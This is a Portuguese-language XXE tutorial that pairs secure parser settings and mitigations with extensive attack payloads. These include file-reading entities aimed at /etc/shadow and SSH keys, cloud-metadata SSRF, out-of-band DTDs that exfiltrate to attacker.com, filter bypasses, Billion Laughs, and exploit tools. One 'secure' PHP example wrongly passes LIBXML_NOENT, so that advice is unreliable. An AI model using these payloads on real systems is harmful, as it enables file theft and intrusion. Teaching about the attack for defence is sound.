---
title: "XXE"
---

# XXE - XML External Entity Injection

# O que é?

XML (eXtensible Markup Language) é uma linguagem de marcação hierárquica projetada para representar
dados estruturados de forma legível tanto por humanos quanto por máquinas. Tornou-se padrão W3C em
1998 e desde então é amplamente utilizado para troca de dados, configuração de sistemas e
serialização de objetos em ambientes enterprise.

A estrutura básica do XML é composta por elementos aninhados, atributos e conteúdo textual:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<pedido id="4521">
  <cliente>
    <nome>João Silva</nome>
    <email>joao@empresa.com</email>
  </cliente>
  <item quantidade="3">Produto A</item>
</pedido>
```

Além dos elementos, o padrão XML define o conceito de **DTD (Document Type Definition)** — uma
forma de declarar a estrutura esperada de um documento XML. O DTD pode ser interno (dentro do
próprio documento) ou externo (referenciado por URL).

Dentro do DTD, é possível declarar **entidades**, que funcionam como atalhos textuais — similares
a variáveis de substituição:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE catalogo [
  <!ENTITY empresa "Acme Tecnologia Ltda">
  <!ENTITY versao  "2.4.1">
]>
<catalogo>
  <produto fornecedor="&empresa;" versao="&versao;">
    Widget Premium
  </produto>
</catalogo>
```

Neste exemplo, `&empresa;` e `&versao;` são entidades internas — seus valores estão definidos
diretamente no DTD. Quando o parser processa o documento, substitui cada referência pelo valor
correspondente antes de entregar o conteúdo à aplicação.

O padrão XML também define **entidades externas** (External Entities), cujo valor não está
declarado inline, mas sim carregado de uma fonte externa: um arquivo local do sistema ou uma URL
remota. A sintaxe usa a palavra-chave `SYSTEM` ou `PUBLIC`:

```xml
<!-- Entidade externa apontando para arquivo local -->
<!ENTITY config SYSTEM "file:///etc/app/config.xml">

<!-- Entidade externa apontando para URL remota -->
<!ENTITY preco  SYSTEM "http://precos.intranet/tabela.xml">
```

**XXE (XML eXternal Entity injection)** é a classe de vulnerabilidades que surge quando um
parser XML processa entidades externas em documentos controlados pelo atacante. O impacto varia
conforme o ambiente: o vetor mais comum é a leitura arbitrária de arquivos do servidor via
`file:///etc/passwd`; quando a entidade aponta para uma URL interna, o parser vira um cliente
HTTP involuntário e o ataque converge com SSRF. Mesmo sem resposta direta visível, dados podem
ser exfiltrados via callbacks out-of-band por DNS ou HTTP. A expansão exponencial de entidades
(Billion Laughs) permite negação de serviço ao esgotar memória do parser. Em cenários raros com
módulos especiais habilitados, o schema `expect://` possibilita execução remota de código.

A raiz do problema está no fato de que o suporte a entidades externas foi projetado como
funcionalidade legítima da especificação XML — não é um bug, mas sim uma feature que se torna
perigosa quando aplicada a input não confiável sem as devidas restrições no parser.

---

# Onde é implementado?

XML está presente em uma quantidade surpreendente de camadas de software enterprise e de
consumo. Qualquer uma dessas superfícies pode ser vetor de XXE se o parser estiver mal
configurado:

**Configurações de projetos e frameworks**
- `pom.xml` (Maven/Java) — define dependências, plugins e build lifecycle
- `applicationContext.xml` (Spring) — define beans e injeção de dependências
- `AndroidManifest.xml` — descreve permissões, activities e serviços de apps Android
- `web.xml` (Java EE) — configuração de servlets e filtros
- `*.csproj`, `*.sln` (MSBuild/.NET) — projetos Visual Studio

**Formatos de documento Office**
- Arquivos `.docx`, `.xlsx`, `.pptx` são ZIPs contendo XML interno
- `word/document.xml`, `xl/workbook.xml`, `ppt/slides/slide1.xml`
- Serviços que processam uploads de documentos Office são candidatos diretos a XXE

**Web services SOAP**
- Amplamente usados em sistemas bancários, de saúde, governamentais e ERPs legados
- Toda a mensagem SOAP é um envelope XML — incluindo cabeçalhos e corpo da requisição
- Exemplos: SAP, Oracle Financials, integrações com sistemas de pagamento bancário

**Imagens SVG**
- SVG (Scalable Vector Graphics) é XML puro — pode conter declarações DOCTYPE e entidades
- Serviços que aceitam upload de imagens e renderizam SVG no servidor são vulneráveis
- Plataformas de avatar, editores de documento, geradores de thumbnail

**Feeds RSS e Atom**
- Blogs, podcasts, agregadores de notícias — qualquer sistema que importa feeds RSS
- O formato RSS 2.0 e Atom 1.0 são XML; importadores que processam feeds externos
  podem ser vulneráveis se o parser não tiver proteções

**Protocolos de autenticação e mensageria**
- SAML (Security Assertion Markup Language) — autenticação federada (SSO)
  O fluxo SAML envolve XML assinado trocado entre IDP e SP; XXE pode preceder
  validação de assinatura em implementações vulneráveis
- XMPP (Jabber) — protocolo de mensagens instantâneas baseado em XML
- SOAP/WSDL — descrição e invocação de web services

**Importação de dados em sistemas enterprise**
- ERPs (SAP, Totvs, Oracle) que aceitam importação de dados via XML
- CRMs que permitem importar listas de contatos ou produtos em formato XML
- Sistemas de gestão de estoque com integração via EDI (Electronic Data Interchange)
- Conversores de formato que transformam XML em outros formatos internos

**APIs legadas**
- APIs construídas antes de JSON se popularizar frequentemente usam XML como formato
- Serviços que suportam tanto JSON quanto XML para compatibilidade retroativa

---

# Como funciona de forma adequada?

Um parser XML bem configurado deve processar documentos estruturados, expandir entidades
internas inofensivas e entregar os dados à aplicação — sem nunca fazer requisições externas
ou acessar o sistema de arquivos local em resposta a declarações DTD.

**Estrutura XML válida e seu processamento:**

```
+--------------------------------------------------+
|  Documento XML                                   |
|                                                  |
|  [Declaration]  <?xml version="1.0"?>            |
|       |                                          |
|       v                                          |
|  [DTD interno]  <!DOCTYPE root [                 |
|                   <!ENTITY co "Acme Corp">       |
|                 ]>                               |
|       |                                          |
|       v                                          |
|  [Root Element] <root>                           |
|       |                                          |
|       +---> [Child] <nome>&co;</nome>            |
|       |                                          |
|       +---> [Child] <versao>1.0</versao>         |
|                                                  |
+--------------------------------------------------+
         |
         | Parser processa
         v
+--------------------------------------------------+
|  Resultado entregue à aplicação:                 |
|                                                  |
|  root.nome    = "Acme Corp"   <- entidade        |
|  root.versao  = "1.0"         <- texto literal   |
|                                                  |
+--------------------------------------------------+
```

**Dois modelos de parsing XML:**

```
SAX (Simple API for XML)          DOM (Document Object Model)
--------------------------------  --------------------------------
Streaming, evento por evento      Carrega documento inteiro na RAM
Baixo consumo de memória          Permite navegação bidirecional
Não retorna árvore completa       Retorna árvore de nós modificável
Bom para documentos grandes       Bom para documentos menores

Ambos podem ser vulneráveis a XXE se external entities estiverem ativas.
```

**Exemplo de DTD interno inofensivo (uso legítimo de entidades):**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE relatorio [
  <!ENTITY empresa    "Acme Tecnologia Ltda">
  <!ENTITY departamento "Engenharia de Software">
  <!ENTITY ano        "2025">
]>
<relatorio>
  <cabecalho>
    <titulo>Relatório Anual &ano;</titulo>
    <emitido-por>&empresa; - &departamento;</emitido-por>
  </cabecalho>
  <corpo>
    Este relatório refere-se ao exercício de &ano;.
  </corpo>
</relatorio>
```

Neste exemplo, `&empresa;`, `&departamento;` e `&ano;` são entidades **internas** — seus valores
estão declarados no próprio DTD, sem referenciar nada externo. O parser substitui cada uma pelo
valor correspondente antes de entregar o documento. Isso é uso legítimo e seguro.

**Por que XXE existe: o problema de defaults históricos**

A especificação XML original não antecipou o cenário de parsers processando documentos de
fontes não confiáveis (internet). Em 1998, XML era usado principalmente para troca entre
sistemas internamente confiáveis. Os parsers foram implementados com entidades externas
habilitadas por padrão como resultado dessa premissa.

```
Premissa original (1998):          Realidade atual:
+--------------------------+       +--------------------------+
| XML usado internamente   |       | XML recebido de qualquer |
| entre sistemas da mesma  |  -->  | fonte externa: browsers, |
| organização (confiáveis) |       | APIs, uploads, crawlers  |
+--------------------------+       +--------------------------+
         |                                    |
         v                                    v
 External entities ok            External entities = vetor de ataque
```

**Configuração segura de parsers XML (desabilitar external entities):**

```java
// Java — DocumentBuilderFactory (SEGURO)
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

// Desabilitar entidades externas gerais (<!ENTITY nome SYSTEM "...">)
dbf.setFeature(
    "http://xml.org/sax/features/external-general-entities", false);

// Desabilitar entidades externas de parâmetro (<!ENTITY % nome SYSTEM "...">)
dbf.setFeature(
    "http://xml.org/sax/features/external-parameter-entities", false);

// Desabilitar carregamento de DTD externo
dbf.setFeature(
    "http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

// Não expandir referências de entidades
dbf.setExpandEntityReferences(false);

// Ativar processamento seguro (feature adicional de alguns parsers)
dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);

DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(new InputSource(new StringReader(xml)));
```

```python
# Python — lxml (SEGURO)
from lxml import etree

parser = etree.XMLParser(
    resolve_entities=False,   # Não resolver entidades externas
    no_network=True,          # Bloquear requisições de rede
    load_dtd=False,           # Não carregar DTDs externos
    dtd_validation=False      # Não validar contra DTD
)
tree = etree.parse(xml_file, parser)

# Alternativa: usar defusedxml (biblioteca Python focada em segurança XML)
import defusedxml.ElementTree as ET
tree = ET.parse(xml_file)   # Seguro por padrão — bloqueia XXE, Billion Laughs, etc.
```

```php
// PHP — configuração segura
// PHP < 8.0: desabilitar entidades externas explicitamente
libxml_disable_entity_loader(true);  // deprecated em PHP 8.0+
$xml = simplexml_load_string($data, 'SimpleXMLElement', LIBXML_NONET);

// PHP 8.0+: entidades externas desabilitadas por padrão na maioria dos casos,
// mas ainda é necessário não passar LIBXML_NOENT nem LIBXML_DTDLOAD:
$xml = simplexml_load_string($data, 'SimpleXMLElement', 0);

// DOMDocument (PHP) — seguro:
$dom = new DOMDocument();
$dom->loadXML($data, LIBXML_NONET | LIBXML_NOENT);
// LIBXML_NOENT substitui entidades mas não carrega externas com LIBXML_NONET
```

**Benefícios de processar XML sem external entities:**

```
+----------------------------------------+
| Parser sem external entities:          |
|                                        |
| + Nenhuma requisição de rede emitida   |
| + Nenhum arquivo local lido pelo DTD  |
| + Proteção contra SSRF via XML        |
| + Proteção contra LFI via XML         |
| + Proteção contra OOB exfiltration    |
| + Performance melhor (sem I/O externo)|
+----------------------------------------+
```

---

## A Falha: Parser XML Processa Entidades Externas Não Intencionais

XXE acontece quando um parser XML processa entidades externas — uma funcionalidade legítima do padrão XML que permite referenciar conteúdo de arquivos locais ou URLs externas dentro de um documento.

A suposição de design incorreta: o parser XML suporta entidades externas por design histórico. Essa feature foi criada para automação e composição de documentos XML — incluir partes comuns de documentos, referenciar esquemas externos, compor grandes documentos a partir de partes menores. É uma feature documentada e intencional da especificação XML.

**Por que o desenvolvedor cria essa falha**: parsers XML vêm com entidades externas habilitadas por padrão em muitas bibliotecas (`DocumentBuilderFactory` em Java, `simplexml_load_string` em PHP < 8.0, `lxml` em Python). O desenvolvedor não desabilita explicitamente essa funcionalidade porque não sabe que ela existe ou não imagina que o input XML poderia conter declarações `DOCTYPE` com entidades externas maliciosas.

**Consequência real**: ao processar um documento XML controlado pelo atacante, o parser faz fetch de arquivos locais (`file:///etc/passwd`) ou URLs internas (`http://169.254.169.254/`), inserindo o conteúdo no documento processado. O resultado é lido de volta pela aplicação e frequentemente refletido na resposta — expondo arquivos sensíveis ou abrindo vetor de SSRF.

---

## Causa Raiz

O padrão XML define `DOCTYPE` e entidades externas como parte legítima da especificação. Quando o parser encontra `<!ENTITY xxe SYSTEM "file:///etc/passwd">`, ele faz exatamente o que a especificação manda: lê o arquivo e substitui `&xxe;` pelo conteúdo.

```java
// VULNERÁVEL — Java (DocumentBuilderFactory com defaults)
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
// entidades externas ativas por padrão
Document doc = db.parse(new InputSource(new StringReader(xml)));
// Parser lê arquivo local se XML contiver <!ENTITY xxe SYSTEM "file:///etc/passwd">

// SEGURO — Java (desabilitar entidades externas explicitamente)
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setExpandEntityReferences(false);
DocumentBuilder db = dbf.newDocumentBuilder();
```

```python
# VULNERÁVEL — Python (lxml com defaults)
from lxml import etree
tree = etree.parse(xml_file)
# resolve_entities=True por padrão

# SEGURO — Python (desabilitar rede e entidades)
from lxml import etree
parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True,
    load_dtd=False,
    dtd_validation=False
)
tree = etree.parse(xml_file, parser)
```

```php
// VULNERÁVEL — PHP < 8.0 (entidades externas habilitadas por padrão)
$xml = simplexml_load_string($data);

// SEGURO — PHP (não passar flags que habilitam entidades)
// Correto: não usar LIBXML_NOENT nem LIBXML_DTDLOAD
$xml = simplexml_load_string($data, 'SimpleXMLElement', 0);

// PHP 8.0+: entidades externas desabilitadas por padrão
// mas ainda é necessário garantir explicitamente em versões anteriores
```

O que está faltando: desabilitar explicitamente entidades externas no parser antes de processar qualquer input não confiável. A configuração segura deve ser a padrão no código — não algo aplicado apenas quando "parece necessário".

---

## Como o Parser XML Resolve Entidades Externas e Lê Arquivos

### Estrutura XML e Entidades

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE raiz [
  <!ENTITY nome "valor">
]>
<raiz>&nome;</raiz>
```

Quando parser processa `&nome;`, substitui pelo valor da entidade. Com entidades externas, esse valor vem de URL ou arquivo do sistema:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

O parser lê `/etc/passwd` e insere conteúdo onde `&xxe;` for referenciado.

### Tipos de Entidades

| Tipo                  | Sintaxe                                     | Uso                              |
|-----------------------|---------------------------------------------|----------------------------------|
| Interna               | `<!ENTITY nome "valor">`                    | Substituição simples             |
| Externa (SYSTEM)      | `<!ENTITY nome SYSTEM "URL">`               | Arquivo local ou URL externa     |
| Externa (PUBLIC)      | `<!ENTITY nome PUBLIC "id" "URL">`          | Recursos públicos                |
| Parâmetro             | `<!ENTITY % nome SYSTEM "URL">`             | Usado só em DTD, para OOB XXE    |

### Fluxo de Exploração

```
Atacante                  Servidor                    Sistema de Arquivos
   |                           |                               |
   |-- POST /api/xml           |                               |
   |   (payload XXE) --------> |                               |
   |                           |-- parser XML processa DOCTYPE |
   |                           |   resolve entidade externa    |
   |                           |-- lê /etc/passwd -----------> |
   |                           |<-- conteúdo do arquivo ------ |
   |<-- resposta com conteúdo--|
   |   do arquivo /etc/passwd  |
```

---

## Identificação

### Detectar Endpoints XML

```bash
# Content-Type indica XML
Content-Type: application/xml
Content-Type: text/xml
Content-Type: application/soap+xml

# Parâmetros que aceitam XML
# Funcionalidades: importar dados, carregar config, webhooks, SOAP

# Testar injeção de entidade simples (não prejudicial):
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe "teststring">]>
<root>&xxe;</root>

# Se "teststring" aparecer na resposta = parser processa entidades
```

### Fingerprint de Parser XML

```bash
# Entidade que gera erro útil
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://nao-existe.invalid/">
]>
<root>&xxe;</root>

# Erro de conexão com URL = parser tenta resolver entidades externas
# Sem erro ou erro genérico = provável mitigação

# Teste de OOB (callback DNS):
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://SEU-ID.oast.fun/">
]>
<root>&xxe;</root>
```

---

## Exploitation

### XXE Básico - Leitura de Arquivo Local

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

### Leitura de Arquivos - Alvos Prioritários

```bash
# Linux
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///etc/hostname
file:///etc/os-release
file:///proc/self/environ
file:///proc/self/cmdline
file:///proc/self/status
file:///proc/net/tcp
file:///root/.bash_history
file:///root/.ssh/id_rsa
file:///root/.ssh/authorized_keys
file:///var/www/html/config.php
file:///var/www/html/wp-config.php
file:///var/www/html/.env
file:///home/USER/.ssh/id_rsa

# Configs de serviços
file:///etc/apache2/apache2.conf
file:///etc/nginx/nginx.conf
file:///etc/mysql/my.cnf
file:///opt/app/config/database.yml
file:///app/config.py

# Windows
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/Windows/win.ini
file:///C:/inetpub/wwwroot/web.config
file:///C:/Users/Administrator/.ssh/id_rsa
file:///C:/xampp/apache/conf/httpd.conf
file:///C:/wamp/www/config.php
```

### XXE via DOCTYPE Externo

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">
<root>
  <data>&xxe;</data>
</root>
```

Arquivo `evil.dtd` no servidor do atacante:
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

### XXE para SSRF

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root>&xxe;</root>

<!-- Acessar serviços internos -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
<!ENTITY xxe SYSTEM "http://192.168.1.100/secret">
```

### XXE com PHP Filter Wrapper (Bypass de Restrição de Caracteres)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>

<!-- Resultado: conteúdo do arquivo em base64 na resposta -->
<!-- Decodificar: echo "BASE64STRING" | base64 -d -->

<!-- Outros filtros PHP úteis -->
<!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "php://filter/convert.iconv.UTF-8.UTF-16/resource=/etc/passwd">
```

---

## Técnicas Avançadas

### Out-of-Band (OOB) XXE - Exfiltração via DTD Externo

Quando resposta não reflete conteúdo da entidade. Exfiltrar via requisição DNS/HTTP para servidor controlado.

**Passo 1**: Payload enviado para o servidor alvo:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>&send;</root>
```

**Passo 2**: Arquivo `evil.dtd` no servidor do atacante:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%send;
```

Fluxo:
1. Parser carrega `%xxe;` do servidor do atacante (evil.dtd)
2. evil.dtd define `%file;` = conteúdo de /etc/passwd
3. evil.dtd define `%eval;` que cria entidade `send` com dado no URL
4. `%send;` faz requisição HTTP para attacker.com com conteúdo do arquivo no parâmetro
5. Atacante vê o arquivo nos logs do seu servidor

```bash
# Log no servidor do atacante:
# GET /?data=root:x:0:0:root:/root:/bin/bash%0Adaemon:x:1:1:... HTTP/1.0
```

### OOB via DNS (quando HTTP está bloqueado)

**evil.dtd**:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY send SYSTEM 'http://%file;.attacker.com/'>">
%eval;
%send;
```

Conteúdo do arquivo aparece como subdomínio na query DNS. Limitado a nomes válidos de hostname (sem `/`, `:`).

### Error-Based XXE

Forçar erro de parser para vazar conteúdo na mensagem de erro:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root/>
```

Parser tenta abrir arquivo que não existe (`/nonexistent/root:x:0:0:...`), gera erro com o path completo — que inclui conteúdo do `/etc/passwd`. Visível na resposta de erro.

### XInclude Attack

Quando aplicação não aceita DOCTYPE customizado mas ainda processa XML:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>

<!-- XInclude é especificação W3C — alguns parsers seguros ainda processam -->
<!-- Não requer DOCTYPE: bypass de filtros que apenas bloqueiam <!DOCTYPE -->
```

### Billion Laughs (XXE DoS)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

Expansão exponencial: 10^9 strings "lol" na memória. Crash de aplicação/servidor.

---

## XXE via File Upload

### SVG Upload

SVG é XML — aplicação que renderiza SVGs processa entidades:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

Upload como `evil.svg`. Se aplicação renderizar em servidor e retornar, conteúdo do arquivo aparece na imagem ou na resposta.

```bash
# Salvar como evil.svg e fazer upload
# Verificar resposta ou imagem gerada

# Para OOB em SVG:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&send;</text>
</svg>
```

### DOCX / XLSX / PPTX Upload

Documentos Office são arquivos ZIP com XML interno. Modificar XML dentro do ZIP:

```bash
# Descompactar DOCX
unzip documento.docx -d docx_content/

# Editar word/document.xml (ou xl/workbook.xml para XLSX)
# Adicionar XXE payload no início do XML

# Exemplo: editar docx_content/word/document.xml
# Adicionar antes de <w:document>:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# Referenciar &xxe; em algum texto do documento

# Reembalar
cd docx_content && zip -r ../evil.docx .

# Upload e verificar se conteúdo aparece no processamento
```

### XML via Content-Type Customizado

```bash
# Aplicação pode aceitar XML mesmo com Content-Type JSON
# Tentar:
POST /api/endpoint HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

# Ou mudar JSON para XML estruturalmente equivalente
```

---

## XXE em Contextos Específicos

### SOAP Web Services

```xml
POST /service HTTP/1.1
Content-Type: application/soap+xml

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser>
      <username>&xxe;</username>
    </GetUser>
  </soap:Body>
</soap:Envelope>
```

### SAML Authentication Bypass via XXE

```xml
<!-- SAML Response pode conter XXE se servidor processa sem proteção -->
<!-- Interceptar SAMLResponse com Burp, decodificar base64, injetar XXE -->

<?xml version="1.0"?>
<!DOCTYPE samlp:Response [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion>
    <saml:AttributeValue>&xxe;</saml:AttributeValue>
  </saml:Assertion>
</samlp:Response>
```

### XXE via RSS / Atom Feed Import

```xml
<?xml version="1.0"?>
<!DOCTYPE rss [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<rss version="2.0">
  <channel>
    <title>&xxe;</title>
    <item>
      <title>Test</title>
    </item>
  </channel>
</rss>
```

---

## Bypass

### Bypass de Bloqueio de DOCTYPE

Se aplicação filtra `<!DOCTYPE`:

```xml
<!-- XInclude não requer DOCTYPE -->
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>

<!-- Testar em diferentes endpoints que aceitam XML -->
```

### Bypass via Encoding

```xml
<?xml version="1.0" encoding="UTF-16"?>
<!-- Mudar encoding pode confundir filtros que buscam string "DOCTYPE" em UTF-8 -->

<!-- Ou via encoding das entidades: -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

### Bypass de Filtro de "file://"

```xml
<!-- Tentar variações do schema -->
<!ENTITY xxe SYSTEM "FILE:///etc/passwd">
<!ENTITY xxe SYSTEM "file://localhost/etc/passwd">
<!ENTITY xxe SYSTEM "file:////etc/passwd">

<!-- PHP wrappers se aplicação usa PHP -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "expect://id">
<!ENTITY xxe SYSTEM "phar:///tmp/upload.phar/test">
```

### Bypass via Entidade Parâmetro Aninhada

Alguns filtros bloqueiam entidades gerais (`&xxe;`) mas não parâmetro (`%xxe;`):

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % a "<!ENTITY b SYSTEM 'file:///etc/passwd'>">
  %a;
]>
<root>&b;</root>
```

### Bypass de WAF via Comentários em DOCTYPE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!-- comentário aqui -->
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### XXE via Content-Type Incomum

```bash
# Algumas apps aceitam XML com Content-Type application/json mas parseiam como XML
# Ou aceitam Content-Type: text/plain com corpo XML

POST /import HTTP/1.1
Content-Type: text/plain

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

---

## Ferramentas

### XXEinjector

```bash
git clone https://github.com/enjoiz/XXEinjector
cd XXEinjector

# Uso com request file
ruby XXEinjector.rb --host=attacker.com --file=/tmp/request.xml \
  --path=/etc/passwd --oob=http

# Opções principais:
# --host: IP do servidor do atacante (para OOB)
# --file: arquivo com request HTTP (marcar ponto de injeção com XXEINJECT)
# --path: arquivo a ser lido
# --oob: método de exfiltração (http, dns, ftp)
# --phpfilter: usar php://filter para arquivos binários
# --cdata: encapsular em CDATA para bypass
# --dtd: URL para DTD externo

# Formato do arquivo de request:
POST /xml-endpoint HTTP/1.1
Host: alvo.com
Content-Type: application/xml

XXEINJECT
```

### Burp Suite - Detecção e Exploração Manual

```bash
# 1. Interceptar requests que enviam XML
# 2. Burp Scanner detecta XXE automaticamente (Pro)
# 3. Modificar manualmente payload em Repeater

# Extensão: Collaborator Everywhere
# Injeta payloads OOB em todos os parâmetros automaticamente

# Extensão: XML External Entity Injector (community)
```

### oxml_xxe (Ruby)

```bash
# Cria documentos Office maliciosos com XXE
gem install oxml_xxe

# Gerar DOCX malicioso
oxml_xxe create docx --target http://attacker.com/evil.dtd

# Gerar XLSX malicioso
oxml_xxe create xlsx --target http://attacker.com/evil.dtd
```

### Linha de Comando para Servidor OOB

```bash
# Servidor Python simples para capturar callbacks OOB
python3 -m http.server 80

# Servidor netcat para raw TCP
nc -lvnp 80

# Servidor ngrok para expor localhost
ngrok http 80

# Interactsh para callbacks automáticos
interactsh-client
```

### DTD Generator Script

```bash
# Criar arquivo DTD dinâmico para OOB XXE
cat > /var/www/html/evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
EOF

# Servir com Python:
python3 -m http.server 80
```

---

## Detecção e Mitigação

### Indicadores de Vulnerabilidade

```bash
# Aplicação retorna conteúdo de arquivo em resposta XML
# Aplicação demora ao processar (OOB resolvendo DNS/HTTP)
# Erros de parser com paths de arquivo

# Grep em logs por acesso a arquivos sensíveis via processo web:
grep "apache\|nginx\|www-data" /var/log/auth.log
auditd: tipo=OPEN, path=/etc/passwd, processo=php-fpm
```

### Padrões em WAF Logs

```bash
# Detectar tentativas de XXE nos logs:
grep "SYSTEM" /var/log/nginx/access.log | grep -i "file\|http"
grep "DOCTYPE" /var/log/apache2/access.log
grep "ENTITY" /var/log/app.log

# Payloads codificados em base64 (tentar decodificar):
cat access.log | grep "samlResponse" | base64 -d 2>/dev/null | grep "DOCTYPE"
```

### Mitigações

```
1. Desabilitar processamento de entidades externas no parser
   Java (DocumentBuilderFactory):
     factory.setFeature("http://xml.org/sax/features/external-general-entities", false)
     factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false)
     factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false)
   
   Python (lxml):
     etree.XMLParser(resolve_entities=False, no_network=True)
   
   PHP (libxml):
     libxml_disable_entity_loader(true)  // deprecated em PHP 8.0+
     // PHP 8.0+: entidades externas desabilitadas por padrão

2. Usar parser com EXTERNAL_GENERAL_ENTITIES = false por padrão

3. Usar formatos de dados menos complexos (JSON) quando XML não for obrigatório

4. Validar schema XML antes de processar (XSD validation)

5. Não retornar conteúdo de entidades na resposta (mitiga in-band, não OOB)

6. Implementar allowlist de schemas permitidos (bloquear file://, php://, etc.)

7. Sandboxing do processo que parseia XML (sem acesso a /etc/, /root/, etc.)
```

---

## Quick Reference

| Payload                                         | Efeito                                       |
|-------------------------------------------------|----------------------------------------------|
| `<!ENTITY xxe SYSTEM "file:///etc/passwd">`     | Leitura inline de arquivo local              |
| `<!ENTITY xxe SYSTEM "http://127.0.0.1/admin">` | SSRF via XXE                                 |
